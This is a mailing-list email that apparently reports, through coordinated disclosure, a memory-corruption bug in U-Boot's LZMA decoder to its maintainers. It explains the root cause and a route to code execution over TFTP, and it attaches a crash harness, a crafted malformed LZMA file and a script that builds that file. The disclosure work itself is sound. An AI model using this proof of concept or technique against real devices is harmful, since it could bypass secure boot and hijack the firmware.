Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 95378C52D71
	for <u-boot@archiver.kernel.org>; Fri,  2 Aug 2024 05:58:03 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id C836088717;
	Fri,  2 Aug 2024 07:58:01 +0200 (CEST)
Authentication-Results: phobos.denx.de; dmarc=fail (p=none dis=none) header.from=gmail.com
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=fail reason="signature verification failed" (2048-bit key; unprotected) header.d=gmail.com header.i=@gmail.com header.b="VFEJQYC4";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id 474CF88B0B; Thu,  1 Aug 2024 20:20:21 +0200 (CEST)
Received: from mail-pj1-x1036.google.com (mail-pj1-x1036.google.com
 [IPv6:2607:f8b0:4864:20::1036])
 (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id 632D488A48
 for <u-boot@lists.denx.de>; Thu,  1 Aug 2024 20:20:18 +0200 (CEST)
Authentication-Results: phobos.denx.de;
 dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: phobos.denx.de;
 spf=pass smtp.mailfrom=darekjens@gmail.com
Received: by mail-pj1-x1036.google.com with SMTP id
 98e67ed59e1d1-2cfd1b25aaaso2373909a91.0
 for <u-boot@lists.denx.de>; Thu, 01 Aug 2024 11:20:18 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=gmail.com; s=20230601; t=1722536416; x=1723141216; darn=lists.denx.de;
 h=to:subject:message-id:date:from:in-reply-to:references:mime-version
 :from:to:cc:subject:date:message-id:reply-to;
 bh=4zZw14Dy4YfqZoNb9Ow7nqbWyzGc937odmY82fd/wM0=;
 b=VFEJQYC4AiK7SWMeLrGnU+5v24SskMBInuzMKA2yuDKgnLMOciKSQmaJqHK16iZkUY
 agXIM0qtdxOQ6iwfSAauNgG33I/2smwhQfcayizJMRvjLrV4GNNaouaVtu1ZvH7hCgrL
 Jxf/pSE4I4dv7bfu4tiilBI69662i4nqY0Vzwt26nG4G9LR463FD1D1cfepgYIMTxSpc
 gcSCeddyCDf8/TVSg9dkqi+supCDqO1FdbH0oykvK4EdIiz1kXy/EHNKVaPoyixXFmXq
 2DeA/vdGZmriXan+Min9C81HySjm3CwX6wX/J6J8kPKJ1nLFRQyJ7b51pbNcBRL0+7Ta
 +5jQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20230601; t=1722536416; x=1723141216;
 h=to:subject:message-id:date:from:in-reply-to:references:mime-version
 :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
 bh=4zZw14Dy4YfqZoNb9Ow7nqbWyzGc937odmY82fd/wM0=;
 b=soiVYXOiNiTHka5ie12DvyC0pTzm9Wi7zt/x7zoONXYMwD+Ry8JQiFAYkZ/YPMWpJc
 /GtojKc2aJRKN33bI6Tv0DFMuIshpL8ol5lOAlqNJJWS/iXxjrBgmN9/yPSB9relgZ9C
 a6wZgcGrtTvZQOgwFJZGsOSalmpLYxPPSiiRkOTcdsRlYLBntu7Uo5G7co1HJl+FHGpy
 2uuDrH4M/Yxyg5g+NEG0CMg9FUzbTEe5GC1yljgwg8/mjsQrvYVA9pGhzg2FekEQf5UR
 di2U+QfPOnDCC+CIjQzv7xIaZTptpY4r1PILZbXI1+FKCRbiQMiXMHNRQ60sE+VNL8gC
 HJaQ==
X-Gm-Message-State: AOJu0YwTpBugHVGkCsY38W0esAZA9oFhTx01RxPKGRztcIqUjN9mERL+
 fPoTpO4JVApwwtyPYf+YtkXhopvLlRYVq4C1SAhD5UzCYmy2bQi3wg+My5FUaSq2JTFmz6d5TUG
 zdQK/M2XRjF29OL+byCTBnl0KF8ZUOE6I4Yc=
X-Google-Smtp-Source: AGHT+IHnhCIvytgBmdne/jYviUCK86fsL/hzKyLs3+PcASnZ0rdZafrnMiG+M0gUResfZau0oSX32e0/s5SAFbpMNFw=
X-Received: by 2002:a17:90b:19d0:b0:2c5:1a3:6170 with SMTP id
 98e67ed59e1d1-2cff9544afamr1264816a91.38.1722536416056; Thu, 01 Aug 2024
 11:20:16 -0700 (PDT)
MIME-Version: 1.0
References: <CAC7rXdTb5u5pzP-mr_+pddCxzfcO8Vm_t-=_+5wxRitMjy6-JA@mail.gmail.com>
In-Reply-To: <CAC7rXdTb5u5pzP-mr_+pddCxzfcO8Vm_t-=_+5wxRitMjy6-JA@mail.gmail.com>
From: Darek <x64x6a@gmail.com>
Date: Thu, 1 Aug 2024 11:20:05 -0700
Message-ID: <CAC7rXdSx3rYaekCenZd9E9HpONs8sMWRQhRjeGXOehv6k7rSfw@mail.gmail.com>
Subject: Re: Vulnerability in LZMA implementation
To: u-boot@lists.denx.de, "trini@konsulko.com" <trini@konsulko.com>, 
 marek.vasut+renesas@mailbox.org, "sjg@chromium.org" <sjg@chromium.org>
Content-Type: multipart/mixed; boundary="000000000000313344061ea343fd"
X-Mailman-Approved-At: Fri, 02 Aug 2024 07:57:59 +0200
X-Content-Filtered-By: Mailman/MimeDel 2.1.39
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

--000000000000313344061ea343fd
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

I have attached a bad LZMA file generated by modifying a valid LZMA's size
to 0 as described.  The attached `create_bad_lzma.py` was used for this.

I have also attached a dummy proof-of-concept that mimic's U-Boots calls to
LzmaDecode().
When ran on linux, this segfaults off the page within the memcpy():
```
root@ubuntu:~/7z/7-Zip/C# gcc -I`pwd` LzmaDec.c test.c -o test
root@ubuntu:~/7z/7-Zip/C# ./test
uncompressed size: 0x0
compressed size:   0xfffffffffffffffa
7z Release: 19.00
Segmentation fault (core dumped)
```

I can get another PoC working in U-Boot to show that it can be used to gain
code execution, but I would need some time to get another environment
setup.

Please let me know if have questions.
Thank you,
Darek

On Wed, Jul 31, 2024 at 4:31=E2=80=AFPM Darek <x64x6a@gmail.com> wrote:

> Hello!  I hope this is all the correct contacts for reporting this issue.
>
> I have discovered that there is a vulnerability in the version of 7z LZMA
> that U-Boot is using (9.20).  I've found this to lead to code execution
> when used with `lzmadec`.
> I have found no issued CVEs or public disclosures announcing this
> vulnerability, but it appears to have been patched in 7z LZMA version 21.=
02
> alpha.  I've patched locally with 24.07 and U-Boot appeared to LZMA
> decompress successfully, but I'm unaware of other use cases within the
> project.  I would also be curious if another LZMA implementation would be
> considered.
>
> I'm separately coordinating disclosure with the 7z maintainers and
> planning on requesting a CVE.  Since your project uses an older version
> that is unlikely to get a backported patch, and the issue is already fixe=
d
> in newer versions, I am disclosing this to U-Boot maintainers at the same
> time.
>
>
> The bug triggers when an LZMA has the 8-byte length field in the header
> set to 0.  This field is located at offset 5 from the start of an LZMA fi=
le.
> Due to how the logic of `LzmaDec_DecodeToDic()` works, this eventually
> reaches a `memcpy(p->tempBuf, src, inSize)` on this line -
> https://github.com/u-boot/u-boot/blob/8877bc51a8a4d921ba2f163208b8b1a57ba=
47c18/lib/lzma/LzmaDec.c#L793
>
> The `inSize` value here is allowed to be greater than the buffer size due
> to the previous if-statement ignoring this value if `checkEndMarkNow` is
> set.
> The return value from `LzmaDec_TryDummy()` also needs to return
> `DUMMY_ERROR` to reach the `memcpy()`.
>
> The value of `dicLimit` in this function is initially the value read from
> the LZMA header, which for this case is 0.  Under my testing, when this w=
as
> 0, it hits the memcpy call, using the passed `srcLen` value (`inSize`).
>
> Within `lmzadec`, this value is originally set to max size_t as the
> default here -
> https://github.com/u-boot/u-boot/blob/8877bc51a8a4d921ba2f163208b8b1a57ba=
47c18/cmd/lzmadec.c#L24
>
> And passed to the `LzmaDecode()` function here -
> https://github.com/u-boot/u-boot/blob/8877bc51a8a4d921ba2f163208b8b1a57ba=
47c18/lib/lzma/LzmaTools.c#L110
>
>
> Under my testing, when `lzmadec` is passed an LZMA file with a 0-length
> field, this ends up calling:
> ```
> memcpy(p->tempBuf, src, 0xFFFFFFFFFFFFFFF5)
> ```
> This is no longer max size_t due to previous subtractions in this loop an=
d
> within a previous function:
>
> https://github.com/u-boot/u-boot/blob/8877bc51a8a4d921ba2f163208b8b1a57ba=
47c18/lib/lzma/LzmaDec.c#L746
> and
>
> https://github.com/u-boot/u-boot/blob/8877bc51a8a4d921ba2f163208b8b1a57ba=
47c18/lib/lzma/LzmaTools.c#L51
>
> This leads to code execution when the corrupted LZMA file is large enough
> to overwrite `memcpy()`'s instructions, or if the memory past the LZMA fi=
le
> is also controlled previously.
>
> In my testing, I created a small LZMA file and modified the header's size
> to 0.  I then appended assembly instructions that performed a loop to thi=
s
> file, so that when code execution would occur, I could easily verify by
> seeing the loop. I repeated this until the file was over 1GB.
> In U-Boot CLI, I then used TFTP to load the LZMA file from my server and
> then ran `lzmadec`with my selected source and destination address far awa=
y
> from U-Boot's code.  When I attached a debugger at this point, the progra=
m
> was stuck in my infinite loop code.
>
>
> I believe this is especially a concern for secure boot implementations
> that utilize U-Boot's LZMA decompression, as it could bypass their secure
> boot implementation.
>
> Please let me know if any additional details are needed or if a
> proof-of-concept video/script would be required for further evidence.
>
> Thank you,
> Darek
>

--000000000000313344061ea343fd
Content-Type: text/plain; charset="US-ASCII"; name="test.c"
Content-Disposition: attachment; filename="test.c"
Content-Transfer-Encoding: base64
Content-ID: <f_lzblev7r1>
X-Attachment-Id: f_lzblev7r1

LyoNCmdjYyAtSWBwd2RgIEx6bWFEZWMuYyB0ZXN0LmMgLW8gdGVzdA0KLi90ZXN0DQoNCkx6bWFE
ZWNvZGUoKSBjYWxsaW5nIGxvZ2ljIGJvcnJvd2VkIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL3Ut
Ym9vdC91LWJvb3QvYmxvYi9tYXN0ZXIvbGliL2x6bWEvTHptYVRvb2xzLmMjTDEwOA0KKi8NCiNp
bmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5o
Pg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5
cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQojaW5jbHVkZSAic3lzL3N0YXQuaCIN
CiNpbmNsdWRlIDxmY250bC5oPg0KDQojaW5jbHVkZSAiTHptYURlYy5oIg0KI2luY2x1ZGUgIjd6
VmVyc2lvbi5oIg0KDQojZGVmaW5lIExaTUFfU0laRV9PRkZTRVQgICAgICAgTFpNQV9QUk9QU19T
SVpFDQojZGVmaW5lIExaTUFfREFUQV9PRkZTRVQgICAgICAgTFpNQV9TSVpFX09GRlNFVCtzaXpl
b2YodWludDY0X3QpDQoNCnN0YXRpYyB2b2lkICpTekFsbG9jKGNvbnN0IElTekFsbG9jICpwLCBz
aXplX3Qgc2l6ZSkgeyByZXR1cm4gbWFsbG9jKHNpemUpOyB9DQpzdGF0aWMgdm9pZCBTekZyZWUo
Y29uc3QgSVN6QWxsb2MgKnAsIHZvaWQgKmFkZHJlc3MpIHsgZnJlZShhZGRyZXNzKTsgfQ0KDQpp
bnQgZ2V0X2ZpbGUoY29uc3QgY2hhciAqIGZpbGVuYW1lLCB2b2lkICoqYWRkcil7DQogICAgaW50
IGZkLCByZXQ7DQogICAgc2l6ZV90IGxlbl9maWxlLCBsZW47DQogICAgc3RydWN0IHN0YXQgc3Q7
DQoNCiAgICBFTHptYVN0YXR1cyBzdGF0ZTsNCiAgICBtZW1zZXQoJnN0YXRlLCAwLCBzaXplb2Yo
c3RhdGUpKTsNCg0KICAgIGlmICgoZmQgPSBvcGVuKGZpbGVuYW1lLCBPX1JEV1IgfCBPX0NSRUFU
LCBTX0lSV1hVIHwgU19JUkdSUCB8IFNfSVJPVEgpKSA8IDApew0KICAgICAgICBwZXJyb3IoIkVy
cm9yIGluIGZpbGUgb3BlbmluZyIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAg
aWYgKChyZXQgPSBmc3RhdChmZCwgJnN0KSkgPCAwKXsNCiAgICAgICAgcGVycm9yKCJFcnJvciBp
biBmc3RhdCIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIGxlbl9maWxlID0gc3Qu
c3Rfc2l6ZTsNCg0KICAgIGlmICgoKmFkZHIgPSBtbWFwKE5VTEwsIGxlbl9maWxlLCBQUk9UX1JF
QUQsIE1BUF9TSEFSRUQsZmQsMCkpID09IE1BUF9GQUlMRUQpew0KICAgICAgICBwZXJyb3IoIkVy
cm9yIGluIG1tYXAiKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIHJldHVybiAw
Ow0KfQ0KDQp2b2lkIG1haW4oKXsNCiAgICBjaGFyICpzcmMsICpkc3Q7DQogICAgc2l6ZV90IHVu
Y29tcHJlc3NlZFNpemUsIGNvbXByZXNzZWRTaXplOw0KICAgIHNpemVfdCBvdXRQcm9jZXNzZWQ7
DQogICAgRUx6bWFTdGF0dXMgc3RhdGU7DQogICAgSVN6QWxsb2MgZ19BbGxvYzsNCiAgICANCiAg
ICBtZW1zZXQoJnN0YXRlLCAwLCBzaXplb2Yoc3RhdGUpKTsNCg0KICAgIGdfQWxsb2MuQWxsb2Mg
PSBTekFsbG9jOw0KICAgIGdfQWxsb2MuRnJlZSA9IFN6RnJlZTsNCg0KICAgIGlmIChnZXRfZmls
ZSgiL3RtcC9iYWRfdGVzdC5sem1hIiwgKHZvaWQqKikmc3JjKSA9PSAtMSkgew0KICAgICAgICBy
ZXR1cm47DQogICAgfQ0KDQogICAgLy8gcmVhZCB2YWx1ZSBmcm9tIExaTUEgaGVhZGVyDQogICAg
dW5jb21wcmVzc2VkU2l6ZSA9ICoodWludDY0X3QgKikoJnNyY1tMWk1BX1NJWkVfT0ZGU0VUXSk7
DQogICAgcHJpbnRmKCJ1bmNvbXByZXNzZWQgc2l6ZTogMHglbHhcbiIsIHVuY29tcHJlc3NlZFNp
emUpOw0KDQogICAgLy8gc2V0IHRvIG1heCBzaXplX3QsIGFzIGl0IHdhcyBkb25lIGluIFUtQm9v
dCBoZXJlIHdpdGggYGRzdF9sZW5gIC0gaHR0cHM6Ly9naXRodWIuY29tL3UtYm9vdC91LWJvb3Qv
YmxvYi9tYXN0ZXIvY21kL2x6bWFkZWMuYyNMMjQNCiAgICBjb21wcmVzc2VkU2l6ZSA9IH4wVUw7
DQogICAgLy8gdGhpcyBpcyBmb2xsb3dlZCBieSBhIHN1YnRyYWN0IG9mIHByb3BzIHNpemUgLSBo
dHRwczovL2dpdGh1Yi5jb20vdS1ib290L3UtYm9vdC9ibG9iL21hc3Rlci9saWIvbHptYS9Mem1h
VG9vbHMuYyNMNTENCiAgICBjb21wcmVzc2VkU2l6ZSA9IChjb21wcmVzc2VkU2l6ZSAtIExaTUFf
UFJPUFNfU0laRSk7DQogICAgcHJpbnRmKCJjb21wcmVzc2VkIHNpemU6ICAgMHglbHhcbiIsIGNv
bXByZXNzZWRTaXplKTsNCg0KICAgIHByaW50ZigiN3ogUmVsZWFzZTogJXNcbiIsIE1ZX1ZFUlNJ
T04pOw0KICAgIEx6bWFEZWNvZGUoDQogICAgICAgIGRzdCwgJnVuY29tcHJlc3NlZFNpemUsDQog
ICAgICAgIHNyYyArIExaTUFfREFUQV9PRkZTRVQsICZjb21wcmVzc2VkU2l6ZSwNCiAgICAgICAg
c3JjLCBMWk1BX1BST1BTX1NJWkUsIExaTUFfRklOSVNIX0VORCwgJnN0YXRlLCAmZ19BbGxvYyk7
DQp9
--000000000000313344061ea343fd
Content-Type: application/octet-stream; name="bad_test.lzma"
Content-Disposition: attachment; filename="bad_test.lzma"
Content-Transfer-Encoding: base64
Content-ID: <f_lzblemoy0>
X-Attachment-Id: f_lzblemoy0

XQAAgAAAAAAAAAAAAAAg6oy1TbzrVF3jH7n/7lEAAA==
--000000000000313344061ea343fd
Content-Type: application/octet-stream; name="create_bad_lzma.py"
Content-Disposition: attachment; filename="create_bad_lzma.py"
Content-Transfer-Encoding: base64
Content-ID: <f_lzblh9my2>
X-Attachment-Id: f_lzblh9my2

aW1wb3J0IG9zDQppbXBvcnQgc3RydWN0DQoNCm5ld19zaXplID0gMA0KZGF0YSA9IGIiQUFBQUFB
QUFCQkJCQkJCQkNDQ0NDQ0NDREREREREREQiDQoNCmZpbGVuYW1lID0gJy90bXAvZ29vZF90ZXN0
Jw0KbHptYV9maWxlbmFtZSA9ICcvdG1wL2dvb2RfdGVzdC5sem1hJw0KYmFkX2x6bWFfZmlsZW5h
bWUgPSAnL3RtcC9iYWRfdGVzdC5sem1hJw0KDQojIGNyZWF0ZSB2YWxpZCBsem1hIGZpbGUgdXNp
bmcgc3lzdGVtIGx6bWEgKHh6KQ0Kd2l0aCBvcGVuKGZpbGVuYW1lLCAnd2InKSBhcyBmOg0KICAg
IGYud3JpdGUoZGF0YSkNCm9zLnN5c3RlbShmImx6bWEgLXoge2ZpbGVuYW1lfSAtYyA+IHtsem1h
X2ZpbGVuYW1lfSIpDQoNCndpdGggb3Blbihsem1hX2ZpbGVuYW1lLCAncmInKSBhcyBmOg0KICAg
IGx6bWFfY29udGVudHMgPSBieXRlYXJyYXkoZi5yZWFkKCkpDQoNCiMgc2V0IGxlbmd0aCBoZWFk
ZXIgdG8gMA0KZm9yIGksYyBpbiBlbnVtZXJhdGUoc3RydWN0LnBhY2soJzxRJywgbmV3X3NpemUp
KToNCiAgICBsem1hX2NvbnRlbnRzWzUgKyBpXSA9IGMNCg0KIyB3cml0ZSBvdXQgbmV3IGZpbGUN
CndpdGggb3BlbihiYWRfbHptYV9maWxlbmFtZSwgJ3diJykgYXMgZjoNCiAgICBmLndyaXRlKGx6
bWFfY29udGVudHMpDQoNCnByaW50KGJhZF9sem1hX2ZpbGVuYW1lKQ0KDQo=
--000000000000313344061ea343fd--
